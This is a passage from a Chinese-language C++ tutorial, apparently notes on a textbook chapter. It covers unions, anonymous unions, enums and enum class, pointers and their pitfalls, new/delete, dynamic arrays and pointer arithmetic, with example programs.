结果不可靠 // 存储并使用 long 成员 (会覆盖之前的 double 值) data.l_val = 1234567890L; std::cout &lt;&lt; &quot;Stored as long: &quot; &lt;&lt; data.l_val &lt;&lt; std::endl; // --- 追踪当前有效成员 --- // 通常需要一个额外的变量来记录当前哪个成员是有效的 enum DataType &#123; INT, LONG, DOUBLE &#125;; struct DataPacket &#123; DataType type; // 记录当前存储的数据类型 DataValue value; // 共用体存储实际值 &#125;; DataPacket packet; packet.type = INT; packet.value.i_val = 255; // 根据类型访问 if (packet.type == INT) &#123; std::cout &lt;&lt; &quot;Packet contains int: &quot; &lt;&lt; packet.value.i_val &lt;&lt; std::endl; &#125; // ... 其他类型的检查 return 0;&#125; 重要: 程序员有责任跟踪共用体中当前哪个成员是活动的（有效的）。读取非活动成员的值会导致未定义行为或得到无意义的数据。通常会结合一个枚举类型或整数标志来指示当前存储的数据类型，如 DataPacket 示例所示。 匿名共用体 (Anonymous Union): 共用体可以不带名称直接定义在结构体或类内部（或函数局部作用域）。匿名共用体的成员可以直接通过结构/类变量访问，就像它们是结构/类的直接成员一样。匿名共用体的所有成员仍然共享相同的内存。 123456789101112131415161718192021222324252627#include &lt;iostream&gt;struct Widget &#123; char type; // &#x27;I&#x27; for integer, &#x27;F&#x27; for float union &#123; // 匿名共用体 int intVal; float floatVal; &#125;; // 注意这里没有变量名&#125;;int main() &#123; Widget w; w.type = &#x27;I&#x27;; w.intVal = 123; // 直接访问匿名共用体的成员 if (w.type == &#x27;I&#x27;) &#123; std::cout &lt;&lt; &quot;Widget value (int): &quot; &lt;&lt; w.intVal &lt;&lt; std::endl; &#125; else if (w.type == &#x27;F&#x27;) &#123; // w.floatVal = 3.14f; // 如果要存 float // std::cout &lt;&lt; &quot;Widget value (float): &quot; &lt;&lt; w.floatVal &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Size of Widget: &quot; &lt;&lt; sizeof(Widget) &lt;&lt; std::endl; // 大小通常是 char 的大小 + 最大成员(int 或 float)的大小 + 可能的对齐填充 return 0;&#125; 使用场景: 节省内存: 当数据项有多种可能类型，但一次只使用一种时。 类型双关 (Type Punning): 以不同的类型解释同一块内存区域（例如，将一个 float 的位模式解释为一个 int）。这是一种低级技巧，通常不可移植且可能违反 C++ 的严格别名规则 (strict aliasing rules)，应谨慎使用或避免。 与结构的比较: 内存: 结构的所有成员都有自己独立的内存地址；共用体的所有成员共享起始地址。 大小: 结构的大小约等于其所有成员大小之和（加上可能的对齐填充）；共用体的大小等于其最大成员的大小。 有效性: 结构的所有成员可以同时有效；共用体只有一个成员能同时有效。 C++11 及以后的共用体: C++11 放宽了对共用体成员类型的限制，允许包含具有非平凡构造函数、析构函数或赋值运算符的类类型成员（如 std::string）。但是，如果共用体包含这样的成员，编译器不会自动生成默认的构造函数、析构函数或复制/移动操作。程序员必须手动管理这些成员的生命周期（例如，使用 placement new 在共用体内存上构造对象，并在不再需要时显式调用析构函数）。这使得包含复杂类型的共用体使用起来更加复杂和易错。对于只包含 POD (Plain Old Data) 类型（如 int, float, 指针, C 风格数组/结构）的共用体，其行为与 C 语言中类似。 4.6 枚举C++ 的 enum 工具提供了一种创建符号常量 (Symbolic Constant) 的方式，常用于定义一组相关的、具有名称的整数常量。这比使用 const int 或 #define 来定义一组相关常量更方便、更具可读性。 基本概念: 枚举类型 (Enumeration Type): enum 关键字用于创建一个新的用户定义的整数类型。 枚举量 (Enumerator): 在枚举类型定义中列出的标识符。它们是具名的常量，代表整数值。 定义枚举: 使用 enum 关键字，后跟枚举类型的名称，然后在花括号 &#123;&#125; 内列出枚举量，用逗号分隔。 1enum spectrum &#123;red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;; 工作原理: 创建新类型: 上述语句创建了一个名为 spectrum 的新类型。 定义枚举量: red, orange, yellow 等成为 spectrum 类型的符号常量。 自动赋值: 默认情况下，编译器将整数值赋给枚举量，从 0 开始，依次递增 1。 red 值为 0 orange 值为 1 yellow 值为 2 … ultraviolet 值为 7 声明和使用枚举变量: 可以像使用其他类型一样声明枚举类型的变量。枚举变量通常只能被赋予该枚举类型中定义的枚举量。 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;enum spectrum &#123;red, orange, yellow, green, blue, violet, indigo, ultraviolet&#125;;int main() &#123; spectrum band; // 声明一个 spectrum 类型的变量 band band = blue; // 将枚举量 blue 赋给 band (合法) std::cout &lt;&lt; &quot;Current band (enum value): &quot; &lt;&lt; band &lt;&lt; std::endl; // 输出 blue 对应的整数值 5 // band = 2000; // 错误! 不能直接将整数赋给枚举变量 (类型不匹配) // band = red + orange; // 错误! + 运算符未对枚举类型定义 (虽然 red 和 orange 有整数值) // 可以将枚举量赋给 int 变量 (枚举量会自动提升为 int) int colorCode = green; std::cout &lt;&lt; &quot;Color code for green: &quot; &lt;&lt; colorCode &lt;&lt; std::endl; // 输出 3 // 可以强制将 int 转换为枚举类型 (需要显式转换，且需谨慎) band = static_cast&lt;spectrum&gt;(3); // 将 3 转换为 spectrum 类型 (对应 green) std::cout &lt;&lt; &quot;Band after cast: &quot; &lt;&lt; band &lt;&lt; std::endl; // 输出 3 // 比较 if (band == green) &#123; std::cout &lt;&lt; &quot;The band is green.&quot; &lt;&lt; std::endl; &#125; // 在循环中使用 (需要注意类型转换和范围) for (band = red; band &lt;= ultraviolet; band = static_cast&lt;spectrum&gt;(band + 1)) &#123; std::cout &lt;&lt; &quot;Processing band: &quot; &lt;&lt; band &lt;&lt; std::endl; &#125; return 0;&#125; 枚举的优点: 提高可读性: 使用有意义的名称（如 red, blue）代替神秘的数字（0, 4）。 类型安全: 枚举创建了新的类型，有助于防止将不相关的整数值赋给枚举变量（虽然可以通过强制转换绕过）。 代码维护: 如果需要更改某个常量的值或添加新常量，只需修改枚举定义。 4.6.1 设置枚举量的值可以显式地为枚举量指定整数值。 规则: 使用赋值运算符 = 为枚举量指定值。 未被显式赋值的枚举量的值将基于前一个枚举量的值加 1。 第一个枚举量如果未显式赋值，默认为 0。 不同的枚举量可以具有相同的值。 用法与示例: 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;enum BitField &#123; BIT_ZERO, // 默认值为 0 BIT_ONE, // 默认值为 1 BIT_TWO = 4, // 显式赋值为 4 BIT_THREE, // 值为 BIT_TWO + 1 = 5 BIT_FOUR = 8, // 显式赋值为 8 BIT_FIVE = 8, // 显式赋值为 8 (与 BIT_FOUR 相同) BIT_SIX, // 值为 BIT_FIVE + 1 = 9 BIT_SEVEN = BIT_THREE + BIT_FOUR // 值为 5 + 8 = 13&#125;;int main() &#123; std::cout &lt;&lt; &quot;BIT_ZERO: &quot; &lt;&lt; BIT_ZERO &lt;&lt; std::endl; // 0 std::cout &lt;&lt; &quot;BIT_ONE: &quot; &lt;&lt; BIT_ONE &lt;&lt; std::endl; // 1 std::cout &lt;&lt; &quot;BIT_TWO: &quot; &lt;&lt; BIT_TWO &lt;&lt; std::endl; // 4 std::cout &lt;&lt; &quot;BIT_THREE: &quot; &lt;&lt; BIT_THREE &lt;&lt; std::endl; // 5 std::cout &lt;&lt; &quot;BIT_FOUR: &quot; &lt;&lt; BIT_FOUR &lt;&lt; std::endl; // 8 std::cout &lt;&lt; &quot;BIT_FIVE: &quot; &lt;&lt; BIT_FIVE &lt;&lt; std::endl; // 8 std::cout &lt;&lt; &quot;BIT_SIX: &quot; &lt;&lt; BIT_SIX &lt;&lt; std::endl; // 9 std::cout &lt;&lt; &quot;BIT_SEVEN: &quot; &lt;&lt; BIT_SEVEN &lt;&lt; std::endl; // 13 BitField flags = BIT_THREE; std::cout &lt;&lt; &quot;Flags: &quot; &lt;&lt; flags &lt;&lt; std::endl; // 5 return 0;&#125; 4.6.2 枚举的取值范围虽然枚举量是 int 类型的常量，但枚举类型本身 (spectrum, BitField 等) 的取值范围并不一定等同于 int。 C++98/03 标准: 底层类型 (Underlying Type): 编译器会选择一种能够容纳所有枚举量值的整型作为该枚举的底层类型。这个类型至少要和 int 一样大，但如果所有枚举量的值可以用更小的类型（如 char 或 short）表示，编译器可能会选择更小的类型来节省内存。 取值范围: 枚举变量理论上可以存储的值的范围由其底层类型决定。然而，C++ 标准对枚举变量可以合法持有的值有更严格的规定。一个枚举变量可以持有的值，其上限是大于最大枚举量值的最小的 2 的幂减 1，下限类似（如果存在负枚举量值，则为小于最小枚举量值的最大的 2 的幂加 1；如果枚举量都非负，则下限为 0）。 例如，对于 enum spectrum &#123;red=0, ..., ultraviolet=7&#125;，最大枚举量是 7。大于 7 的最小的 2 的幂是 8，所以上限是 8 - 1 = 7。下限是 0。因此，spectrum 变量理论上可以持有 0 到 7 范围内的值。 对于 enum BitField &#123;..., BIT_SEVEN=13&#125;，最大枚举量是 13。大于 13 的最小的 2 的幂是 16，上限是 16 - 1 = 15。下限是 0。BitField 变量理论上可以持有 0 到 15 范围内的值。 赋值限制: 尽管范围可能比枚举量的值域宽，但 C++ 通常不允许直接将超出枚举量定义范围的整数值赋给枚举变量（即使该整数在理论范围内），需要显式类型转换。 C++11 作用域内枚举 (Scoped Enumeration): C++11 引入了 enum class (或 enum struct)，称为作用域内枚举，提供了更强的类型安全和作用域控制： 强类型: enum class 的枚举量不会隐式转换为整数。 作用域: 枚举量的名称被限制在枚举类型的作用域内，访问时需要使用 EnumType::Enumerator。 可指定底层类型: 可以显式指定底层整数类型，例如 enum class Color : unsigned char &#123; Red, Green, Blue &#125;;。 无隐式转换: 不能将整数直接赋给 enum class 变量，也不能将 enum class 变量隐式转换为整数，都需要显式转换 (static_cast)。 用法与示例 (范围和 C++11): 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;enum OldEnum &#123; A = 1, B = 2, C = 4 &#125;; // 最大值 4, 范围可能是 0-7// C++11 作用域内枚举enum class NewEnum &#123; X = 10, Y = 20, Z = 30 &#125;; enum class Status : char &#123; OK = &#x27;O&#x27;, Error = &#x27;E&#x27;, Pending = &#x27;P&#x27; &#125;; // 指定底层类型为 charint main() &#123; OldEnum oe; // oe = 7; // 编译错误 (通常不允许直接赋 int) oe = static_cast&lt;OldEnum&gt;(7); // 合法 (因为 7 在理论范围 0-7 内) std::cout &lt;&lt; &quot;OldEnum value: &quot; &lt;&lt; oe &lt;&lt; std::endl; // 输出 7 // oe = static_cast&lt;OldEnum&gt;(8); // 行为未定义或可能编译错误 (超出理论范围) NewEnum ne = NewEnum::Y; // 必须使用作用域解析符 // int ne_val = ne; // 错误! 不能隐式转换为 int int ne_val = static_cast&lt;int&gt;(ne); // 需要显式转换 std::cout &lt;&lt; &quot;NewEnum value as int: &quot; &lt;&lt; ne_val &lt;&lt; std::endl; // 输出 20 // ne = 20; // 错误! 不能将 int 赋给 enum class ne = static_cast&lt;NewEnum&gt;(10); // 需要显式转换 std::cout &lt;&lt; &quot;NewEnum value after cast: &quot; &lt;&lt; static_cast&lt;int&gt;(ne) &lt;&lt; std::endl; // 输出 10 Status s = Status::OK; char s_char = static_cast&lt;char&gt;(s); // 转换为底层类型 char std::cout &lt;&lt; &quot;Status as char: &quot; &lt;&lt; s_char &lt;&lt; std::endl; // 输出 O return 0;&#125; 总结:传统的 enum 提供了一种创建命名常量的方式，但类型安全较弱，且枚举量会污染所在的作用域。C++11 的 enum class 提供了更强的类型安全和作用域控制，是现代 C++ 中更推荐的选择。在使用传统 enum 时，要注意其取值范围和与整数类型转换的规则。 4.7 指针和自由存储空间到目前为止，我们创建的变量（包括数组、结构等）在声明时，编译器会为其分配内存。这些变量的内存管理是自动的（自动存储或静态存储）。但是，有时我们需要在程序运行时根据需要动态地分配和释放内存。指针 (Pointer) 和 自由存储空间 (Free Store)**（也常称为堆 Heap**）是实现这一目标的关键。 指针是一种特殊的变量，它存储的是另一个变量的内存地址。通过指针，我们可以间接地访问和修改该内存地址处的数据。 自由存储空间是程序可以动态申请使用的内存区域。与自动变量（函数执行完就销毁）或静态变量（程序整个生命周期都存在）不同，程序员需要手动管理自由存储空间中分配的内存的生命周期。 4.7.1 声明和初始化指针声明指针: 声明指针需要指定它将指向的数据类型，并在变量名前加上星号 *（星号可以靠近类型名、变量名或在两者之间）。 1typeName * pointerName; typeName: 指针将要指向的数据的类型。 *: 表明 pointerName 是一个指针。 pointerName: 指针变量的名称。 示例: 1234int * p_int; // 声明一个指向 int 类型的指针 p_intdouble * p_double; // 声明一个指向 double 类型的指针 p_doublechar * p_char; // 声明一个指向 char 类型的指针 p_charstd::string * p_str; // 声明一个指向 string 对象的指针 p_str 获取地址 (&amp; 运算符): 地址运算符 &amp; 用于获取一个变量的内存地址。 初始化指针: 指针在声明时应被初始化，以避免指向不确定的内存地址。常见的初始化方式： 初始化为 nullptr (C++11 及以后): nullptr 是表示空指针的关键字，表示该指针当前不指向任何有效的内存地址。这是推荐的初始化空指针的方式。 初始化为 0 或 NULL: 在 C++11 之前，通常使用 0 或宏 NULL (通常定义为 0) 来表示空指针。虽然仍可用，但 nullptr 类型更安全。 初始化为变量地址: 使用 &amp; 运算符获取一个已存在变量的地址来初始化指针。指针的类型必须与变量的类型匹配（或能隐式转换）。 解引用 (* 运算符): 解引用运算符 * 用于访问指针所指向的内存地址处存储的值。当 * 用于已初始化的有效指针变量前时，它表示“获取指针指向的值”。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;string&gt;int main() &#123; int updates = 6; int * p_updates; // 声明一个指向 int 的指针，未初始化 (危险!) // 初始化指针 int * p_value = nullptr; // 初始化为空指针 (推荐) int * p_zero = 0; // 初始化为空指针 (旧式) // NULL 宏通常在 &lt;cstddef&gt; 或其他 C 头文件中定义 // 使用地址初始化 p_updates = &amp;updates; // 将 updates 变量的地址赋给 p_updates // 访问指针信息 std::cout &lt;&lt; &quot;Value of updates: &quot; &lt;&lt; updates &lt;&lt; std::endl; // 输出 6 std::cout &lt;&lt; &quot;Address of updates: &quot; &lt;&lt; &amp;updates &lt;&lt; std::endl; // 输出 updates 的内存地址 std::cout &lt;&lt; &quot;Value of p_updates (address): &quot; &lt;&lt; p_updates &lt;&lt; std::endl; // 输出存储在 p_updates 中的地址 (同上) // 使用解引用运算符访问指针指向的值 std::cout &lt;&lt; &quot;Value at *p_updates: &quot; &lt;&lt; *p_updates &lt;&lt; std::endl; // 输出 6 (updates 的值) // 使用解引用运算符修改指针指向的值 *p_updates = *p_updates + 1; // 将 p_updates 指向的值 (updates) 加 1 std::cout &lt;&lt; &quot;Now updates has value: &quot; &lt;&lt; updates &lt;&lt; std::endl; // 输出 7 // 指向其他类型 double price = 99.99; double * p_price = &amp;price; // p_price 指向 price std::cout &lt;&lt; &quot;Value at *p_price: &quot; &lt;&lt; *p_price &lt;&lt; std::endl; // 输出 99.99 // int * p_wrong = &amp;price; // 错误! 指针类型 (int*) 与变量类型 (double) 不匹配 return 0;&#125; 关键点: int updates;: updates 是一个 int 变量。 int * p_updates;: p_updates 是一个指针变量，它存储的是一个 int 变量的地址。 p_updates: 存储的地址值。 *p_updates: 存储在该地址处的 int 值。 4.7.2 指针的危险指针非常强大，但也容易出错，是 C++ 中常见的 bug 来源。 解引用未初始化的指针: 如果指针没有被初始化，它会包含一个随机的地址（垃圾值）。解引用这种指针（试图访问该随机地址处的值）会导致未定义行为，通常导致程序崩溃。 123int * p_uninitialized;// std::cout &lt;&lt; *p_uninitialized; // 极度危险! 程序可能崩溃// *p_uninitialized = 100; // 极度危险! 可能覆盖关键数据或导致崩溃 解引用空指针: 解引用 nullptr (或 0, NULL) 同样是未定义行为，通常也会导致程序崩溃。在使用指针前，最好检查它是否为空。 12345int * p_null = nullptr;// std::cout &lt;&lt; *p_null; // 危险! 程序可能崩溃if (p_null != nullptr) &#123; // 检查指针是否有效 std::cout &lt;&lt; *p_null; &#125; 悬挂指针 (Dangling Pointer): 当指针指向的内存已经被释放或不再有效时，该指针就成为悬挂指针。解引用悬挂指针也是未定义行为。这通常发生在 delete 之后（见 4.7.5）或指向局部变量的指针在其作用域结束后仍然存在时。 123456int * p_dangle;&#123; int local_var = 10; p_dangle = &amp;local_var; // p_dangle 指向局部变量&#125; // local_var 在这里被销毁，内存可能被回收// std::cout &lt;&lt; *p_dangle; // 危险! p_dangle 是悬挂指针 内存泄漏 (Memory Leak): 如果使用 new 分配了内存（见 4.7.4），但忘记使用 delete 释放，或者丢失了指向该内存的唯一指针，这块内存就无法再被程序访问或释放，造成内存泄漏。程序运行时间越长，泄漏的内存越多，最终可能耗尽系统资源。 安全使用指针的建议: 总是初始化指针: 声明指针时立即初始化为 nullptr 或一个有效的地址。 在使用前检查: 在解引用指针前，检查它是否为 nullptr。 谨慎处理指针生命周期: 确保指针指向的内存在指针使用期间是有效的。 配对 new 和 delete: 动态分配的内存必须手动释放。 4.7.3 指针和数字虽然指针存储的是内存地址，而地址本质上是数字，但指针类型和整数类型是不同的。不能随意将整数赋给指针（除了 0/nullptr），也不能直接将指针当作普通整数进行算术运算（指针算术有特殊规则，见 4.8）。 1234567891011121314151617181920212223242526#include &lt;iostream&gt;int main() &#123; int value = 10; int * p_value = &amp;value; // 指针的值是地址 (一个数字) std::cout &lt;&lt; &quot;Address stored in p_value: &quot; &lt;&lt; p_value &lt;&lt; std::endl; // 不能直接将任意整数赋给指针 // p_value = 1000; // 错误! 类型不匹配 (除非使用 reinterpret_cast，但通常不安全) p_value = nullptr; // 合法，赋空指针 p_value = 0; // 合法，赋空指针 // 指针可以转换为整数 (通常使用 reinterpret_cast，不推荐) // uintptr_t address_as_int = reinterpret_cast&lt;uintptr_t&gt;(p_value); // std::cout &lt;&lt; &quot;Address as integer: &quot; &lt;&lt; address_as_int &lt;&lt; std::endl; // 整数不能直接转换为指针 (除了 0) int address_int = 2000; // int * p_from_int = address_int; // 错误! // int * p_from_int = reinterpret_cast&lt;int*&gt;(address_int); // 可以编译，但极度危险 return 0;&#125; 将指针视为地址，而不是普通的数字，有助于避免类型错误和不安全的操作。 4.7.4 使用new来分配内存new 运算符用于在程序的自由存储区 (Free Store) 或 堆 (Heap) 上动态分配内存。这允许你在运行时根据需要创建变量或对象，而不是在编译时就确定。 语法: 123456pointerVariable = new typeName;// 或者在声明时分配typeName * pointerVariable = new typeName;// 也可以带初始化器typeName * pointerVariable = new typeName (initializer); // C++98/03typeName * pointerVariable = new typeName &#123;initializer&#125;; // C++11 列表初始化 new: 运算符。 typeName: 要分配内存的数据类型。 initializer (可选): 用于初始化新分配内存的值。 工作流程: new 在自由存储区找到一块足够大的、未使用的内存块，以存储 typeName 类型的数据。 new 返回这块内存的起始地址。 这个地址被赋给一个相应类型的指针变量。 如果 new 无法分配所需的内存（例如内存不足），它会抛出一个 std::bad_alloc 异常（除非使用了 new (std::nothrow) 版本，该版本在失败时返回 nullptr）。 用法与示例: 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include &lt;new&gt; // 为了 std::bad_alloc (虽然不一定需要显式包含) 和 std::nothrowint main() &#123; // 分配一个 int 的内存 int * p_int = new int; // 在自由存储区分配一个 int 大小的内存 if (p_int == nullptr) &#123; // 理论检查 (对于普通 new，失败会抛异常) std::cout &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl; return 1; &#125; *p_int = 101; // 通过指针访问并赋值 // 分配一个 double 并初始化 double * p_double = new double (99.99); // 分配并初始化为 99.99 // 或者 C++11 列表初始化 // double * p_double = new double &#123;99.99&#125;; std::cout &lt;&lt; &quot;Dynamically allocated int: &quot; &lt;&lt; *p_int &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Dynamically allocated double: &quot; &lt;&lt; *p_double &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address of int: &quot; &lt;&lt; p_int &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Address of double: &quot; &lt;&lt; p_double &lt;&lt; std::endl; // --- 内存释放将在下一节讲解 --- // delete p_int; // delete p_double; // 使用 nothrow 版本 (失败时返回 nullptr) int * p_lots_of_ints = new (std::nothrow) int[1000000000]; // 尝试分配巨大数组 if (p_lots_of_ints == nullptr) &#123; std::cout &lt;&lt; &quot;Huge memory allocation failed, but program continues.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Huge memory allocation succeeded (unlikely).&quot; &lt;&lt; std::endl; // delete[] p_lots_of_ints; // 如果成功，需要释放 &#125; return 0;&#125; 动态分配的内存不会像自动变量那样在作用域结束时自动释放。程序员必须负责在不再需要时手动释放它。 4.7.5 使用delete释放内存delete 运算符用于释放由 new 分配的内存，将其归还给自由存储区，以便后续可以重新分配使用。 语法: 1delete pointerVariable; delete: 运算符。 pointerVariable: 指向由 new（**不是 new[]**）分配的内存的指针。 工作流程: delete 接收一个指针，该指针必须指向由 new 分配的内存块的起始地址。 delete 释放该指针指向的内存块。 指针变量本身的值不会被自动修改（它仍然存储着那个现在无效的地址），成为**悬挂指针 (Dangling Pointer)**。 重要规则: new 和 delete 必须配对使用: 每个 new 都应该对应一个 delete。 不要 delete 同一块内存两次: 对同一块内存执行两次 delete 是未定义行为。 不要 delete 不是由 new 分配的内存: 例如，不要 delete 指向自动变量（栈变量）或静态变量的指针。 不要 delete 空指针 (nullptr): 对空指针执行 delete 是安全且无效果的。 delete 之后将指针设为 nullptr: 释放内存后，最好立即将指针设置为 nullptr，以防止它成为悬挂指针被意外使用。 用法与示例: 1234567891011121314151617181920212223242526272829303132333435363738394041424344#include &lt;iostream&gt;int main() &#123; // 1. 分配内存 int * p_value = new int (42); double * p_temp = new double; *p_temp = 123.45; std::cout &lt;&lt; &quot;Before delete:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; p_value points to: &quot; &lt;&lt; *p_value &lt;&lt; &quot; at address &quot; &lt;&lt; p_value &lt;&lt; std::endl; std::cout &lt;&lt; &quot; p_temp points to: &quot; &lt;&lt; *p_temp &lt;&lt; &quot; at address &quot; &lt;&lt; p_temp &lt;&lt; std::endl; // 2. 释放内存 delete p_value; delete p_temp; std::cout &lt;&lt; &quot;\\nAfter delete:&quot; &lt;&lt; std::endl; // p_value 和 p_temp 现在是悬挂指针! std::cout &lt;&lt; &quot; p_value still holds address: &quot; &lt;&lt; p_value &lt;&lt; std::endl; // std::cout &lt;&lt; &quot; Accessing *p_value: &quot; &lt;&lt; *p_value &lt;&lt; std::endl; // 危险! 未定义行为 // 3. 将指针设为 nullptr (好习惯) p_value = nullptr; p_temp = nullptr; std::cout &lt;&lt; &quot;After setting to nullptr:&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot; p_value holds: &quot; &lt;&lt; p_value &lt;&lt; std::endl; // 输出 0 或类似表示空指针的值 // 对 nullptr 调用 delete 是安全的 delete p_value; // 无效果 delete p_temp; // 无效果 // 错误示例: int stack_var = 10; int * p_stack = &amp;stack_var; // delete p_stack; // 严重错误! 不能 delete 栈内存 int * p1 = new int; int * p2 = p1; // p1 和 p2 指向同一块内存 delete p1; // delete p2; // 严重错误! 删除了同一块内存两次 return 0;&#125; 忘记 delete 会导致内存泄漏，而错误地使用 delete 则可能导致程序崩溃或数据损坏。正确管理动态内存是 C++ 编程中的一项重要技能。 4.7.6 使用new来创建动态数组除了分配单个变量的内存，new 也可以用来动态分配数组。这在你需要在运行时确定数组大小时非常有用。 语法: 123pointerVariable = new typeName [numberOfElements];// 或者typeName * pointerVariable = new typeName [numberOfElements]; new: 运算符。 typeName: 数组元素的数据类型。 numberOfElements: 数组的大小，可以是一个变量或表达式，在运行时计算其值。 []: 表明要分配的是一个数组。 new[] 会分配一块连续的内存，足以容纳 numberOfElements 个 typeName 类型的元素，并返回指向数组第一个元素的指针。 释放动态数组 (delete[]): 释放由 new[] 分配的数组内存必须使用 delete[] 运算符，而不是 delete。 1delete [] pointerVariable; delete[]: 用于释放数组内存的运算符。 pointerVariable: 指向由 new[] 分配的数组内存的指针。 delete[] 和 delete 的区别至关重要: delete[] 知道需要释放的是一个数组，它会正确地调用数组中每个对象（如果是类类型）的析构函数（如果需要），并释放整个数组占用的内存。 如果对 new[] 分配的内存使用 delete（没有 []），行为是未定义的。对于基本类型可能看似正常工作（但仍是错误的），但对于包含对象的数组，很可能只调用第一个对象的析构函数，并可能导致内存损坏或泄漏。 用法与示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;int main() &#123; int size; std::cout &lt;&lt; &quot;Enter the size of the dynamic array: &quot;; std::cin &gt;&gt; size; if (size &lt;= 0) &#123; std::cout &lt;&lt; &quot;Invalid size.&quot; &lt;&lt; std::endl; return 1; &#125; // 1. 使用 new[] 分配动态数组 int * dynArray = new int[size]; // 检查分配是否成功 (可选，对于普通 new[] 失败会抛异常) if (dynArray == nullptr) &#123; std::cout &lt;&lt; &quot;Memory allocation failed!&quot; &lt;&lt; std::endl; return 1; &#125; // 2. 像普通数组一样使用指针访问动态数组元素 for (int i = 0; i &lt; size; ++i) &#123; dynArray[i] = i * 10; // 使用数组下标访问 &#125; std::cout &lt;&lt; &quot;Dynamic array elements:&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; size; ++i) &#123; std::cout &lt;&lt; &quot; dynArray[&quot; &lt;&lt; i &lt;&lt; &quot;] = &quot; &lt;&lt; *(dynArray + i) &lt;&lt; std::endl; // 也可以使用指针算术访问 &#125; // 3. 使用 delete[] 释放动态数组内存 delete [] dynArray; // 4. 将指针设为 nullptr (好习惯) dynArray = nullptr; std::cout &lt;&lt; &quot;Dynamic array deleted.&quot; &lt;&lt; std::endl; // 错误示例: double * p_arr = new double[10]; // delete p_arr; // 错误! 应该使用 delete [] p_arr; return 0;&#125; 总结: 使用 new typeName[size] 分配动态数组。 使用 delete [] pointerVariable 释放动态数组。 必须匹配 new[] 和 delete[]，否则行为未定义。 动态数组提供了在运行时确定数组大小的灵活性，但需要程序员负责内存管理。 4.8 指针、数组和指针算术指针和数组在 C++ 中有着非常紧密的联系。理解这种关系以及指针算术对于有效地使用 C++ 处理内存和数据集合至关重要。 4.8.1 程序说明指针算术允许我们对指针执行一些特殊的算术运算，主要是加法和减法，以便在内存中移动，特别是在数组中。 指针与数组名的关系: 在 C++ 中，数组名在很多情况下会被隐式地当作指向其第一个元素的指针。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;int main() &#123; double wages[3] = &#123;1000.0, 2000.0, 3000.0&#125;; double *p_wages = wages; // 数组名 wages 被当作指向第一个元素的指针 (&amp;wages[0]) std::cout &lt;&lt; &quot;Address of first element (&amp;wages[0]): &quot; &lt;&lt; &amp;wages[0] &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Value of array name (wages): &quot; &lt;&lt; wages &lt;&lt; std::endl; // 输出与 &amp;wages[0] 相同 std::cout &lt;&lt; &quot;Value of pointer (p_wages): &quot; &lt;&lt; p_wages &lt;&lt; std::endl; // 输出与 &amp;wages[0] 相同 // 通过指针访问数组元素 std::cout &lt;&lt; &quot;First element via pointer (*p_wages): &quot; &lt;&lt; *p_wages &lt;&lt; std::endl; // 输出 1000.0 // 指针算术: 将指针移动到下一个元素 p_wages = p_wages + 1; // 指针加 1 std::cout &lt;&lt; &quot;Address after p_wages + 1: &quot; &lt;&lt; p_wages &lt;&lt; std::endl; // 指向 wages[1] 的地址 std::cout &lt;&lt; &quot;Value at *(p_wages + 1) (now *p_wages): &quot; &lt;&lt; *p_wages &lt;&lt; std::endl; // 输出 2000.0 // 使用数组下标访问 (即使是通过指针) p_wages = wages; // 重置指针指向第一个元素 std::cout &lt;&lt; &quot;Accessing via pointer subscript p_wages[1]: &quot; &lt;&lt; p_wages[1] &lt;&lt; std::endl; // 输出 2000.0 std::cout &lt;&lt; &quot;Accessing via array name subscript wages[1]: &quot; &lt;&lt; wages[1] &lt;&lt; std::endl; // 输出 2000.0 // 数组名和指针的区别: // 1. sizeof: sizeof(wages) 是整个数组的大小 (3 * sizeof(double)) // sizeof(p_wages) 是指针本身的大小 (通常 4 或 8 字节) // 2. 地址: &amp;wages 是整个数组的地址 (类型是 double(*)[3]) // &amp;p_wages 是指针变量 p_wages 自身的地址 // 3. 修改: 数组名 wages 是常量，不能修改 (不能 wages = wages + 1;) // 指针 p_wages 是变量，可以修改指向其他地址 (p_wages = p_wages + 1;) std::cout &lt;&lt; &quot;sizeof(wages): &quot; &lt;&lt; sizeof(wages) &lt;&lt; std::endl; std::cout &lt;&lt; &quot;sizeof(p_wages): &quot; &lt;&lt; sizeof(p_wages) &lt;&lt; std::endl; return 0;&#125; 指针算术规则: 指针加整数 p + n: 结果是一个指向 p 原来指向位置之后第 n 个元素的地址。编译器会根据指针指向的类型大小自动计算实际地址偏移量（地址 = p的地址 + n * sizeof(指向的类型)）。 指针减整数 p - n: 结果是一个指向 p 原来指向位置之前第 n 个元素的地址。 指针减指针 p1 - p2: 结果是两个指针之间相隔的元素数量（一个整数）。只有当两个指针指向同一个数组（或超出末尾一个位置）中的元素时，这个操作才有意义。结果的类型是 std::ptrdiff_t (在 &lt;cstddef&gt; 中定义)。 递增/递减: ++p, p++, --p, p-- 分别使指针指向下一个或上一个元素。 比较: 可以使用关系运算符 (&lt;, &gt;, &lt;=, &gt;=) 比较指向同一个数组元素的指针，判断它们的相对位置。也可以使用 == 和 != 比较指针是否指向同一个地址（或是否都为空）。 数组下标和指针的关系: 表达式 arrayName[i] 在 C++ 中等价于 *(arrayName + i)。同样，如果 p 是一个指向数组元素的指针，p[i] 等价于 *(p + i)。 这意味着你可以对数组名使用指针算术（概念上），也可以对指针使用数组下标表示法。 4.8.2 指针小结让我们回顾一下关于指针的关键概念： 声明: 使用 typeName * pointerName; 声明一个指向 typeName 类型数据的指针。 初始化: 使用 &amp; 获取变量地址: pointerName = &amp;variableName; 初始化为空指针: pointerName = nullptr; (C++11) 或 pointerName = 0; 使用 new 分配动态内存: pointerName = new typeName; 或 pointerName = new 